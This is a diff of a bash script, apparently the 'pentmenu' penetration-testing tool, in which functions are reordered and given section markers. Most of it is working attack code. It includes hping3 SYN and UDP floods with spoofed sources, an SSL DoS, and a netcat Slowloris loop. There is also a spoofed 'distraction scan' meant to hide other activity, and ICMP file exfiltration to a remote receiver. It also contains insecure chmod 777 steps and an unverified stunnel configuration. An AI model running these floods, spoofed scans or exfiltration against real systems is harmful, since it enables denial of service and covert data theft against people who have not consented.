@@ -1,6 +1,9 @@
 #!/bin/bash
 PS3="Pentmenu>"
-## MAINMENU
+
+##MAINMENU##
+##################
+##START MAINMENU##
 mainmenu()
 {
 mainmenu=("Recon" "DOS" "Extraction" "View Readme" "Quit")
@@ -17,13 +20,19 @@ extractionmenu
   	elif [ "$opt" = "View Readme" ]; then
 showreadme
 	else 
+#if no valid option is chosen, chastise the user
 	echo "That's not a valid option! Hit Return to show main menu"
 	fi
 done
 }
+##END MAINMENU##
+################
+##/MAINMENU##
 
 
-## RECONMENU
+##RECON##
+###################
+##START RECONMENU##
 reconmenu()
 {
 		reconmenu=("Show IP" "DNS Recon" "Ping Sweep" "Recon Network" "Stealth Scan" "UDP Scan" "Check Server Uptime" "Go back")
@@ -58,8 +67,124 @@ reconmenu()
 	fi
 	done
 }
+##END RECONMENU##
+#################
 
-## DOSMENU
+################
+##START SHOWIP##
+showip()
+{		echo "External IP lookup uses curl..."
+		echo "External IP is detected as:"
+		curl http://canihazip.com/s/
+		echo ""
+		echo ""
+		echo "Interface IP's are:"
+		ip a|grep inet
+	if ! [[ $? = 0 ]]; then
+		ifconfig|grep inet
+	fi
+		echo ""
+}
+##END SHOWIP##
+##############
+
+##################
+##START DNSRECON##
+dnsrecon()
+{ echo "This module performs passive recon via forward/reverse name lookups for the target (as appropriate) and performs a whois lookup"
+	echo "Enter target:"
+	read -i $TARGET -e TARGET
+host $TARGET
+if ! [[ $? = 0 ]]; then
+nslookup $TARGET
+fi
+sleep 1 && whois -H $TARGET
+if ! [[ $? = 0 ]]; then
+sleep 1 && curl ipinfo.io/$TARGET
+fi
+}
+##END DNSRECON##
+################
+
+###################
+##START PINGSWEEP##
+pingsweep()
+{ echo "This module performs a simple ICMP echo 'ping' sweep"
+	echo "Please enter the target (e.g. 192.168.1.0/24):"
+	read -i $SUBNET -e SUBNET
+sudo nmap -sP -PE $SUBNET --reason
+}
+##END PINGSWEEP##
+#################
+
+######################
+##START RECONNETWORK##
+reconnetwork()
+{ echo "This module conducts a scan of the entire network using nmap"
+echo "It will perform a TCP SYN port scan and attempt OS and service identification"
+echo "Depending on the network size, the scan might take a long time to finish"
+echo "Please enter the target (e.g. 192.168.1.0/24):"
+read -i $SUBNET -e SUBNET
+sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" -Pn -sV -sC -A -O $SUBNET --reason
+}
+## END RECONNETWORK##
+#####################
+
+#####################
+##START STEALTHSCAN##
+stealthscan()
+{ echo "This module lets you scan a host/network very stealthily, using a TCP SYN scan"
+echo "Since stealth is important, the scan might take a very long time to finish"
+echo "Enter the host/subnet to scan:"
+read -i $TARGET -e TARGET
+echo "Enter the speed of scan (0 means very slow and 5 means fast).  Default is 3:"
+read -i $SPEED -e SPEED
+: ${SPEED:=3}
+sudo nmap -Pn -p 1-65535 -sS -T $SPEED $TARGET --reason
+}
+##END STEALTHSCAN##
+###################
+
+#################
+##START UDPSCAN##
+udpscan()
+{ echo "This module lets you scan a host/network for open UDP ports"
+echo "This may take some time"
+echo "Enter the host/subnet to scan"
+read -i $TARGET -e TARGET
+echo "Enter the speed of scan (0 means very slow and 5 means fast).  Default is 3:"
+read -i $SPEED -e SPEED
+: ${SPEED:=3}
+sudo nmap -Pn -sU -T $SPEED $TARGET --reason
+}
+##END UDPSCAN##
+###############
+
+#####################
+##START CHECKUPTIME##
+checkuptime()
+{ echo "This module will help you estimate the uptime of a given server."
+  echo "Enter your target:"
+  read -i $TARGET -e TARGET
+  echo "Enter port (default is 80):"
+  read -i $PORT -e PORT
+  : ${PORT:=80}
+  echo "Retries? (3 is ideal and default, 2 might also work)"
+  read -i $RETRY -e RETRY
+  : ${RETRY:=3}
+  echo "Starting.."
+  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
+  echo "Done."
+}
+##END CHECKUPTIME##
+###################
+##/RECON##
+#############
+
+
+##DOS##
+#################
+##START DOSMENU##
 dosmenu()
 {
 		dosmenu=("TCP SYN Flood" "UDP Flood" "SSL DOS" "Slowloris" "Distraction Scan" "Go back")
@@ -88,97 +213,11 @@ dosmenu()
 	fi
 	done
 }
+##END DOSMENU##
+###############
 
-
-## EXTRACTIONMENU
-extractionmenu()
-{
-        extractionmenu=("Extract File via ICMP" "Receive File via ICMP" "Create Listener" "Go back")
-    select extractopt in "${extractionmenu[@]}"; do
-## Extract file via ICMP
-    if [ "$extractopt" = "Extract File via ICMP" ]; then
-        icmpextract
-## Receive file via ICMP
-    elif [ "$extractopt" = "Receive File via ICMP" ]; then
-        icmpreceive
-## Create an arbitrary listener
-    elif [ "$extractopt" = "Create Listener" ]; then
-		listener
-## Go back
-    elif [ "$extractopt" = "Go back" ]; then
-        mainmenu
-## Default error
-    else
-        echo "That's not a valid option! Hit Return to show menu"
-    fi
-    done
-}
-
-##SHOWREADME
-showreadme()
-{
-curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
-}
-
-
-
-##create DNS Recon function
-dnsrecon()
-{ echo "This module performs passive recon via forward/reverse name lookups for the target (as appropriate) and performs a whois lookup"
-	echo "Enter target:"
-	read -i $TARGET -e TARGET
-host $TARGET
-if ! [[ $? = 0 ]]; then
-nslookup $TARGET
-fi
-sleep 1 && whois -H $TARGET
-if ! [[ $? = 0 ]]; then
-sleep 1 && curl ipinfo.io/$TARGET
-fi
-}
-## create pingsweep function
-pingsweep()
-{ echo "This module performs a simple ICMP echo 'ping' sweep"
-	echo "Please enter the target (e.g. 192.168.1.0/24):"
-	read -i $SUBNET -e SUBNET
-sudo nmap -sP -PE $SUBNET --reason
-}
-## create stunnel client function
-stunnel_client() 
-{ echo "use SSL? [y]es or [n]o (default):"
-	read SSL
-	: ${SSL:=n}
-if [[ "$SSL" = "y" ]]
-	then echo "Using SSL/TLS"
-LHOST=127.0.0.1
-LPORT=9991
-grep -q $LPORT /etc/services
-if [[ $? = 1 ]]
-then
-echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
-fi
-if test -f "/bin/ss"; then 
-	LISTPORT=ss; 
-	else LISTPORT=netstat
-fi
-$LISTPORT -tln |grep -q $LPORT
-if [[ "$?" = "1" ]]
-then
-	echo "Creating stunnel client on $LHOST:$LPORT"	
-		sudo rm -f /etc/stunnel/pentmenu.conf;
-		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
-		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
-		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
-		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
-		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
-		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
-		sudo chmod 644 /etc/stunnel/pentmenu.conf
-		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
-else echo "Looks like stunnel is already listening on port 9991, so not recreating"
-fi
-fi }
-
-## create TCP SYN flood function
+#####################
+##START TCPSYNFLOOD##
 synflood()
 {		echo "TCP SYN Flood uses hping3...checking for hping3..."
 	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
@@ -222,7 +261,7 @@ synflood()
 		echo "Enter target:"
 	read -i $TARGET -e TARGET
 		echo "Enter target port:"
-	read PORT
+	read -i $PORT -e PORT
 		echo "Enter Source IP or use [i]nterface IP (default):"
 	read -i $SOURCE -e SOURCE
 		: ${SOURCE:=i}
@@ -239,89 +278,11 @@ synflood()
 	fi
 	fi
 }
+##END TCPSYNFLOOD##
+###################
 
-## create showip function
-showip()
-{		echo "External IP lookup uses curl..."
-		echo "External IP is detected as:"
-		curl http://canihazip.com/s/
-		echo ""
-		echo ""
-		echo "Interface IP's are:"
-		ip a|grep inet
-	if ! [[ $? = 0 ]]; then
-		ifconfig|grep inet
-	fi
-		echo ""
-}
-
-## create slowloris function
-slowloris()
-{ echo "Using netcat for Slowloris attack...." && sleep 1
-echo "Enter target:"
-	read -i $TARGET -e TARGET
-echo "Target is set to $TARGET"
-echo "Enter target port (defaults to 80):"
-	read PORT
-	: ${PORT:=80}
-	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
-PORT=80 && echo "Invalid port, reverting to port 80"
-	elif [ "$PORT" -lt "1" ]; then
-PORT=80 && echo "Invalid port number chosen! Reverting port 80"
-	elif [ "$PORT" -gt "65535" ]; then
-PORT=80 && echo "Invalid port chosen! Reverting to port 80"
-	else echo "Using Port $PORT"
-	fi
-
-echo "Enter number of connections to open (default 2000):"
-		read CONNS
-	: ${CONNS:=2000}
-	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
-CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
-	fi
-
-echo "Choose interval between sending headers."
-echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
-	read INTERVAL
-	: ${INTERVAL:=r}
-	if [[ "$INTERVAL" = "r" ]]
-then
-INTERVAL=$((RANDOM % 11 + 5))
-	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
-then
-INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
-	fi
-stunnel_client
-if [[ "$SSL" = "y" ]]
-then 
-echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
-	i=1
-	while [ "$i" -le "$CONNS" ]; do
-echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
-echo "Opened $CONNS connections....returning to menu"
-else 
-echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
-	i=1
-	while [ "$i" -le "$CONNS" ]; do
-echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
-echo "Opened $CONNS connections....returning to menu"
-fi
-}
-
-## create distraction scan function
-distractionscan()
-{ echo "This module will send a TCP SYN scan with a spoofed source address"
-echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
-echo "Enter target:"
-read -i $TARGET -e TARGET
-echo "Enter spoofed source address:"
-read -i $SOURCE -e SOURCE
-for i in {1..5}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
-exit 0 
-}
-
-
-## create UDP Flood function
+##################
+##START UDPFLOOD##
 udpflood()
 { echo "UDP Flood uses hping3...checking for hping3..."
 if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
@@ -329,7 +290,7 @@ if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 	echo "Enter target:"
 		read -i $TARGET -e TARGET
 	echo "Enter target port:"
-		read PORT
+		read -i $PORT -e PORT
 	echo "Enter random string (data to send):"
 		read DATA
 	echo "Enter Source IP, or [r]andom or [i]nterface IP (default):"
@@ -355,7 +316,7 @@ if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 		echo "Enter target:"
 	read -i $TARGET -e TARGET
 		echo "Enter target port:"
-	read PORT
+	read -i $PORT -e PORT
 		echo "Enter Source IP or use [i]nterface IP (default):"
 	read -i $SOURCE -e SOURCE
 		: ${SOURCE:=i}
@@ -374,14 +335,17 @@ if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
 	fi
 fi
 }
+##END UDPFLOOD##
+################
 
-## create ssldos function
+################
+##START SSLDOS##
 ssldos() 
 { echo "Using openssl for SSL DOS"
 		echo "Enter target:"
 	read -i $TARGET -e TARGET
 		echo "Enter target port (defaults to 443):"
-read PORT
+read -i $PORT -e PORT
 
 : ${PORT:=443}
 
@@ -419,8 +383,158 @@ while : for i in {1..10}
 done
 fi
 }
+##END SSLDOS##
+##############
 
-## create listener function
+##################
+##START SLOWLORIS##
+slowloris()
+{ echo "Using netcat for Slowloris attack...." && sleep 1
+echo "Enter target:"
+	read -i $TARGET -e TARGET
+echo "Target is set to $TARGET"
+echo "Enter target port (defaults to 80):"
+	read -i $PORT -e PORT
+	: ${PORT:=80}
+	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
+PORT=80 && echo "Invalid port, reverting to port 80"
+	elif [ "$PORT" -lt "1" ]; then
+PORT=80 && echo "Invalid port number chosen! Reverting port 80"
+	elif [ "$PORT" -gt "65535" ]; then
+PORT=80 && echo "Invalid port chosen! Reverting to port 80"
+	else echo "Using Port $PORT"
+	fi
+echo "Enter number of connections to open (default 2000):"
+		read CONNS
+	: ${CONNS:=2000}
+	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
+CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
+	fi
+echo "Choose interval between sending headers."
+echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
+	read INTERVAL
+	: ${INTERVAL:=r}
+	if [[ "$INTERVAL" = "r" ]]
+then
+INTERVAL=$((RANDOM % 11 + 5))
+	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
+then
+INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
+	fi
+stunnel_client
+if [[ "$SSL" = "y" ]]
+then 
+echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
+	i=1
+	while [ "$i" -le "$CONNS" ]; do
+echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Opened $CONNS connections....returning to menu"
+else 
+echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
+	i=1
+	while [ "$i" -le "$CONNS" ]; do
+echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Opened $CONNS connections....returning to menu"
+fi
+}
+##END SLOWLORIS##
+#################
+
+#####################
+##START DISTRACTION##
+distractionscan()
+{ echo "This module will send a TCP SYN scan with a spoofed source address"
+echo "This module is designed to be obvious, to distract your target from any real scan or other activity you may actually be performing"
+echo "Enter target:"
+read -i $TARGET -e TARGET
+echo "Enter spoofed source address:"
+read -i $SOURCE -e SOURCE
+for i in {1..5}; do echo "sending scan $i" && sudo hping3 --scan all --spoof $SOURCE -S $TARGET 2>/dev/null 1>/dev/null; done
+exit 0 
+}
+##END DISTRACTION##
+###################
+##/DOS##
+
+
+##EXTRACTION##
+########################
+##START EXTRACTIONMENU##
+extractionmenu()
+{
+        extractionmenu=("Extract File via ICMP" "Receive File via ICMP" "Create Listener" "Go back")
+    select extractopt in "${extractionmenu[@]}"; do
+## Extract file via ICMP
+    if [ "$extractopt" = "Extract File via ICMP" ]; then
+        icmpextract
+## Receive file via ICMP
+    elif [ "$extractopt" = "Receive File via ICMP" ]; then
+        icmpreceive
+## Create an arbitrary listener
+    elif [ "$extractopt" = "Create Listener" ]; then
+		listener
+## Go back
+    elif [ "$extractopt" = "Go back" ]; then
+        mainmenu
+## Default error
+    else
+        echo "That's not a valid option! Hit Return to show menu"
+    fi
+    done
+}
+##END EXTRACTIONMENU##
+######################
+
+########################
+##START ICMPEXTRACTION## 
+icmpextract()
+{ echo "This module will help you extract files via the ICMP protocol"
+  echo "It can be handy in a firewalled environment where ICMP is not blocked"
+  echo "You need an ICMP receiver for this to work (you or a friend can set it up via the receiver module)"
+  echo "Enter the receiver IP:"
+  read -i $RECEIVER -e RECEIVER
+  echo "Enter the FULL PATH of the file you want to extract"
+  read -i $EXTRACT -e EXTRACT
+  echo "What is your secret sign? (needs to be same on both ends)"
+  read -i $SECRET -e SECRET
+  SIZE=$(ls -l $EXTRACT | cut -d ' ' -f 5)
+#calculate size to include length of secret in bytes
+  SECRETSIZE=$(printf "%s" "$SECRET" |wc -c)
+  SIZE=$(expr $SIZE + $SECRETSIZE)
+  echo "Starting extraction.."
+  sudo hping3 $RECEIVER --icmp \
+  --sign $SECRET -d $SIZE -c 1 --file $EXTRACT --end
+  echo "Done. You can check the file integrity on the receiver using hash values"
+}
+##END ICMPEXTRACTION##
+######################
+
+######################
+##START ICMPRECEIVER##
+icmpreceive()
+{ echo "This module will help you receive files via the ICMP protocol"
+  echo "It can be handy in a firewalled environment where ICMP is not blocked"
+  echo "You need an ICMP extractor for this to work (you or a friend can set it up via the extraction module)"
+  echo "Enter the extractor IP:"
+  read -i $EXTRACTOR -e EXTRACTOR
+  echo "Enter the network interface to listen on:"
+  read -i $INTERFACE -e INTERFACE
+  echo "Enter the output file name:"
+  read -i $OUTFILE -e OUTFILE
+  echo "What is your secret sign? (needs to be same on both ends):"
+  read -i $SECRET -e SECRET
+  echo "Starting listener.. Ctrl+C to stop when done."
+  sudo hping3 --listen $EXTRACTOR -I $INTERFACE \
+  --sign $SECRET > $OUTFILE
+  echo "Done, checking filetype.."
+  file $OUTFILE
+  echo "Done. You can check the integrity using hashing values"
+}
+##END ICMPRECEIVER##
+####################
+
+##################
+##START LISTENER##
 listener()
 	{ echo "This module will create a TCP or UDP listener using netcat"
 	echo "Any data (string or file) received will be written out to ./pentmenu.listener.out"
@@ -437,7 +551,7 @@ if test -f "/bin/ss"; then
 
 fi
 	$LISTPORT -$PROTO -n -l 
-echo "Enter port number (defaults to 8000):"
+echo "Enter port number to listen on (defaults to 8000):"
 	read PORT
 : ${PORT:=8000}
 if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
@@ -462,96 +576,67 @@ elif  [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
 	nc -u -k -l -v -p $PORT > $OUTFILE
 fi
 }
+##END LISTENER##
+################
+##/EXTRACTION##
 
 
-## create a network recon function
-reconnetwork()
-{ echo "This module conducts a scan of the entire network using nmap"
-echo "It will perform a TCP SYN port scan and attempt OS and service identification"
-echo "Depending on the network size, the scan might take a long time to finish"
-echo "Please enter the target (e.g. 192.168.1.0/24):"
-read -i $SUBNET -e SUBNET
-sudo nmap -script-args http.useragent="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" -Pn -sV -sC -A -O $SUBNET --reason
+##README##
+####################
+##START SHOWREADME##
+showreadme()
+{
+curl -s https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
 }
+##END SHOWREADME##
+##################
+##/README##
 
-## create a stealth scan function
-stealthscan()
-{ echo "This module lets you scan a host/network very stealthily, using a TCP SYN scan"
-echo "Since stealth is important, the scan might take a very long time to finish"
-echo "Enter the host/subnet to scan:"
-read -i $TARGET -e TARGET
-echo "Enter the speed of scan (0 means very slow and 5 means fast).  Default is 3:"
-read -i $SPEED -e SPEED
-: ${SPEED:=3}
-sudo nmap -Pn -sS -T $SPEED $TARGET --reason
-}
-## udp scan function
-udpscan()
-{ echo "This module lets you scan a host/network for open UDP ports"
-echo "This may take some time"
-echo "Enter the host/subnet to scan"
-read -i $TARGET -e TARGET
-echo "Enter the speed of scan (0 means very slow and 5 means fast).  Default is 3:"
-read -i $SPEED -e SPEED
-: ${SPEED:=3}
-sudo nmap -Pn -sU -T $SPEED $TARGET --reason
-}
-## icmp file extraction function
-icmpextract()
-{ echo "This module will help you extract files via the ICMP protocol"
-  echo "It can be handy in a firewalled environment where ICMP is not blocked"
-  echo "You need an ICMP receiver for this to work (you or a friend can set it up via the receiver module)"
-  echo "Enter the receiver IP:"
-  read -i $RECEIVER -e RECEIVER
-  echo "Enter the FULL PATH of the file you want to extract"
-  read -i $EXTRACT -e EXTRACT
-  echo "What is your secret sign? (needs to be same on both ends)"
-  read -i $SECRET -e SECRET
-  SIZE=$(ls -l $EXTRACT | cut -d ' ' -f 5)
-#calculate size to include length of secret in bytes
-  SECRETSIZE=$(printf "%s" "$SECRET" |wc -c)
-  SIZE=$(expr $SIZE + $SECRETSIZE)
-  echo "Starting extraction.."
-  sudo hping3 $RECEIVER --icmp \
-  --sign $SECRET -d $SIZE -c 1 --file $EXTRACT --end
-  echo "Done. You can check the file integrity on the receiver using hash values"
-}
-## icmp receiver module
-icmpreceive()
-{ echo "This module will help you receive files via the ICMP protocol"
-  echo "It can be handy in a firewalled environment where ICMP is not blocked"
-  echo "You need an ICMP extractor for this to work (you or a friend can set it up via the extraction module)"
-  echo "Enter the extractor IP:"
-  read -i $EXTRACTOR -e EXTRACTOR
-  echo "Enter the network interface to listen on:"
-  read -i $INTERFACE -e INTERFACE
-  echo "Enter the output file name:"
-  read -i $OUTFILE -e OUTFILE
-  echo "What is your secret sign? (needs to be same on both ends):"
-  read -i $SECRET -e SECRET
-  echo "Starting listener.. Ctrl+C to stop when done."
-  sudo hping3 --listen $EXTRACTOR -I $INTERFACE \
-  --sign $SECRET > $OUTFILE
-  echo "Done, checking filetype.."
-  file $OUTFILE
-  echo "Done. You can check the integrity using hashing values"
-}
-## uptime checking function
-checkuptime()
-{ echo "This module will help you estimate the uptime of a given server."
-  echo "Enter your target:"
-  read -i $TARGET -e TARGET
-  echo "Enter port (default is 80):"
-  read -i $PORT -e PORT
-  : ${PORT:=80}
-  echo "Retries? (3 is ideal and default, 2 might also work)"
-  read -i $RETRY -e RETRY
-  : ${RETRY:=3}
-  echo "Starting.."
-  sudo hping3 --tcp-timestamp -S $TARGET -p $PORT -c $RETRY | grep uptime
-  echo "Done."
-}
-## create menu and show welcome message
+
+##GENERIC##
+#################
+##START STUNNEL##
+stunnel_client() 
+{ echo "use SSL? [y]es or [n]o (default):"
+	read SSL
+	: ${SSL:=n}
+if [[ "$SSL" = "y" ]]
+	then echo "Using SSL/TLS"
+LHOST=127.0.0.1
+LPORT=9991
+grep -q $LPORT /etc/services
+if [[ $? = 1 ]]
+then
+echo "Adding pentmenu stunnel service to /etc/services" && sudo chmod 777 /etc/services && sudo echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services &&  sudo chmod 644 /etc/services
+fi
+if test -f "/bin/ss"; then 
+	LISTPORT=ss; 
+	else LISTPORT=netstat
+fi
+$LISTPORT -tln |grep -q $LPORT
+if [[ "$?" = "1" ]]
+then
+	echo "Creating stunnel client on $LHOST:$LPORT"	
+		sudo rm -f /etc/stunnel/pentmenu.conf;
+		sudo touch /etc/stunnel/pentmenu.conf && sudo chmod 777 /etc/stunnel/pentmenu.conf
+		sudo echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
+		sudo echo "client=yes" >> /etc/stunnel/pentmenu.conf
+		sudo echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
+		sudo echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
+		sudo echo "verify=0" >> /etc/stunnel/pentmenu.conf
+		sudo chmod 644 /etc/stunnel/pentmenu.conf
+		sudo stunnel /etc/stunnel/pentmenu.conf && sleep 1
+else echo "Looks like stunnel is already listening on port 9991, so not recreating"
+fi
+fi }
+##END STUNNEL##
+###############
+##/GENERIC##
+
+
+##WELCOME##
+#########################
+##START WELCOME MESSAGE##
 	clear && echo ""
 	echo "Hello and welcome to pentmenu!"
 	echo "Please report all bugs, improvements and suggestions to https://github.com/GinjaChris/pentmenu/issues"
@@ -560,3 +645,6 @@ checkuptime()
 	echo "Please review the readme at https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md before proceeding"
 	echo ""
 mainmenu
+##END WELCOME MESSAGE##
+#######################
+##/WELCOME##
